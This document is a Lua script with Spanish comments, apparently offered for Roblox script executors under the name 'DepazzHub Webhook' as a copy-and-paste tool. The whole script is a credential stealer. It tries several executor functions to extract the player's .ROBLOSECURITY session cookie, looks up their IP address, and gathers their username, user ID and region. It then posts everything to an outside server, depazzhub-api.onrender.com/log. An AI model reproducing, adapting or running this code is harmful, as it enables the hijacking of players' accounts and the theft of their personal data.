-- =====================================================================
-- DEPAZZHUB WEBHOOK - Versión "Zero Install" (Solo copiar y pegar)
-- =====================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. FUNCIÓN MÁXIMA DE EXTRACCIÓN DE COOKIES
local function GetCookie()
    -- Método A: getcookie() (Delta, Hydrogen, Fluxus, etc.)
    if type(getcookie) == "function" then
        local success, result = pcall(getcookie)
        if success and result and tostring(result) ~= "" then
            return tostring(result)
        end
    end
    
    -- Método B: syn.get_cookies()
    if type(syn) == "table" and type(syn.get_cookies) == "function" then
        local success, result = pcall(syn.get_cookies)
        if success and result then
            for _, c in ipairs(result) do
                if c.Name == ".ROBLOSECURITY" then
                    return c.Value
                end
            end
        end
    end
    
    -- Método C: Variables de entorno (getgenv)
    for _, name in ipairs({"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}) do
        local env = getgenv()
        if env[name] and tostring(env[name]) ~= "" then
            return tostring(env[name])
        end
    end
    
    -- Método D: Variable global _G
    if _G[".ROBLOSECURITY"] and tostring(_G[".ROBLOSECURITY"]) ~= "" then
        return tostring(_G[".ROBLOSECURITY"])
    end

    -- Si nada funciona, retornamos nil
    return nil
end

local rawCookie = GetCookie()
local cookieString = rawCookie and (".ROBLOSECURITY=" .. rawCookie) or "No disponible (Bloqueado por este executor)"

-- 2. OBTENER IP (Dato extra de valor en caso de que la cookie falte)
local userIP = "Desconocida"
pcall(function()
    local res = game:HttpGet("https://api.ipify.org")
    userIP = res
end)

-- 3. RECOPILACIÓN DE DATOS (Formato exacto que espera tu index.js)
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = tostring(player.AccountAge) .. " días",
    region = LocalizationService.RobloxLocaleId,
    ip = userIP,
    cookie = cookieString
}

-- 4. FUNCIÓN DE ENVÍO UNIVERSAL
local function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    
    -- Intento 1: request()
    if type(request) == "function" then
        local success, res = pcall(request, {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        if success then return true, res end
    end
    
    if type(http_request) == "function" then
        local success, res = pcall(http_request, {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        if success then return true, res end
    end
    
    local success, res = pcall(function()
        return HttpService:PostAsync(url, jsonData)
    end)
    
    return success, res
end

local webhookUrl = "https://depazzhub-api.onrender.com/log"

local success, response = SendWebhook(webhookUrl, data)

if success then
    print("✅ ¡Webhook enviado correctamente a DepazzHub!")
else
    warn("❌ Error al enviar el webhook:", response)
end
